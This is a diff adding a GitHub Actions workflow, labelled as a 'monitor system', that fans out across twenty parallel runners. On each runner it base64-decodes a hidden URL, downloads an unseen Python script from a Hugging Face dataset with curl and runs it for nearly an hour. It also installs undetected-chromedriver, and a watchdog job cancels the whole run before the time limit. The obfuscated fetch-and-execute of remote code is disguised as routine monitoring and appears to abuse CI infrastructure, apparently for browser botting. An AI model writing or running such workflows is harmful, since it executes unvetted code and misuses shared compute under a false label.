@@ -1,0 +1,103 @@
+name: Apex Matrix Monitor System
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: apex-sys-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog Task: Monitors overall execution time and triggers termination
+  # =================================================================
+  watchdog-controller:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WATCH_DURATION: 3540
+    steps:
+      - name: Initialize Watchdog Protocol
+        run: |
+          echo "--> Watchdog service initialized for active run ID: ${{ github.run_id }}"
+          echo "--> Timer set to ${MAX_WATCH_DURATION} seconds."
+
+          sleep "${MAX_WATCH_DURATION}"
+
+          echo "--> Time threshold reached. Sending workflow cancellation request..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "--> Cancellation signal sent. Terminating active and queued jobs."
+
+  # =================================================================
+  # Worker Cluster: Parallel runner execution across specified node targets
+  # =================================================================
+  worker-cluster:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [A101, A102, B201, B202, C301, C302, D401, D402, E501, E502, F601, F602, G701, G702, H801, H802, J901, J902, K001, K002]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Phase 1: Environment Preparation
+      # -----------------------------------------------------------------
+      - name: Prepare Worker Environment
+        run: |
+          echo "[PHASE 1] Setting up dependencies on Worker-${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Phase 2: Fetch Target Payload
+      # -----------------------------------------------------------------
+      - name: Fetch Executable Script
+        run: |
+          echo "[PHASE 2] Downloading executable payload..."
+          REMOTE_SRC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_SRC" -o task_runner.py
+          echo "[PHASE 2] Download completed successfully."
+
+      # -----------------------------------------------------------------
+      # Phase 3: Install Required Libraries
+      # -----------------------------------------------------------------
+      - name: Install Runtime Libraries
+        run: |
+          echo "[PHASE 3] Installing Python requirements..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Phase 4: Execute Process
+      # -----------------------------------------------------------------
+      - name: Execute Main Process
+        run: |
+          echo "--> Launching process on Worker-${{ matrix.node_code }}..."
+
+          python3 task_runner.py &
+          TASK_PID=$!
+
+          echo "--> Process running in background (PID: $TASK_PID). Max window: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "--> Time limit reached. Forcefully stopping process..."
+            kill -9 "$TASK_PID"
+            echo "--> Process stopped."
+          else
+            echo "--> Process finished ahead of time limit."
+          fi
